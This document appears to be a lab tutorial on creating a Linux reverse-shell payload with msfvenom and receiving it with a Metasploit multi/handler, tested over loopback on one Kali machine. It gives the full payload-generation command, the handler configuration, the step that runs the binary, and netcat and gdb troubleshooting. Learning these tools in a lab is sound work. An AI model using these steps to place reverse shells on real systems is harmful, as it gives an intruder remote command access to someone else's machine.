# Reverse Shell Setup Guide with msfvenom and Metasploit

This guide outlines how to create and execute a Linux reverse shell using `msfvenom` to generate the payload and Metasploit to handle the connection, tested on a single Kali Linux machine.

## Prerequisites

- Kali Linux with Metasploit Framework installed.
- Root or sudo access for network operations.
- Basic understanding of terminal commands.

## Step 1: Verify Network Configuration

1. **Check Your IP Address**:

   ```bash
   ip addr
   ```

   Identify your IP (e.g., `192.168.122.18` on `eth0`) or use `127.0.0.1` for loopback (local testing).

2. **Check Port Availability**: Ensure the chosen port (e.g., `4445`) is free:

   ```bash
   sudo lsof -i :4445
   ```

   If a process is using the port, kill it:

   ```bash
   sudo kill -9 <pid>
   ```

3. **Allow Port in Firewall** (if active):

   ```bash
   sudo ufw allow 4445/tcp
   ```

## Step 2: Generate the Reverse Shell Payload

Create a 64-bit Linux reverse shell payload with `msfvenom`:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4445 -f elf > reverse_shell
```

- Replace `127.0.0.1` with your machine’s IP (e.g., `192.168.122.18`) if testing across machines.

- Make the file executable:

  ```bash
  chmod +x reverse_shell
  ```

## Step 3: Set Up the Metasploit Listener

1. Start Metasploit:

   ```bash
   msfconsole
   ```

2. Configure the handler to match the payload:

   ```
   use exploit/multi/handler
   set PAYLOAD linux/x64/shell_reverse_tcp
   set LHOST 127.0.0.1
   set LPORT 4445
   exploit
   ```

   - Use the same `LHOST` and `LPORT` as in the payload.
   - If binding fails, try `set LHOST 0.0.0.0` or a different port.

## Step 4: Execute the Reverse Shell

Run the payload:

```bash
./reverse_shell
```

The payload connects to the Metasploit listener, opening a shell session in the Metasploit console.

## Step 5: Interact with the Shell

In the Metasploit console, you should see:

```
[*] Command shell session 1 opened ...
```

Type commands like `whoami` or `id` to interact with the shell.

## Troubleshooting

- **Binding Failure**:

  - Check for port conflicts:

    ```bash
    sudo netstat -tulnp | grep 4445
    ```

  - Use a different port and regenerate the payload.

- **No Connection**:

  - Verify `LHOST` matches the listener’s IP.

  - Test connectivity:

    ```bash
    nc -zv 127.0.0.1 4445
    ```

- **Payload Crash**:

  - Debug with `gdb`:

    ```bash
    gdb ./reverse_shell
    run
    backtrace
    ```

## Notes

- Ensure the payload and handler use the same architecture (`x64`), IP, and port.
- For testing on different machines, ensure network reachability and proper firewall rules.
- Use Netcat (`nc -lvp 4445`) as an alternative listener to debug payload issues.
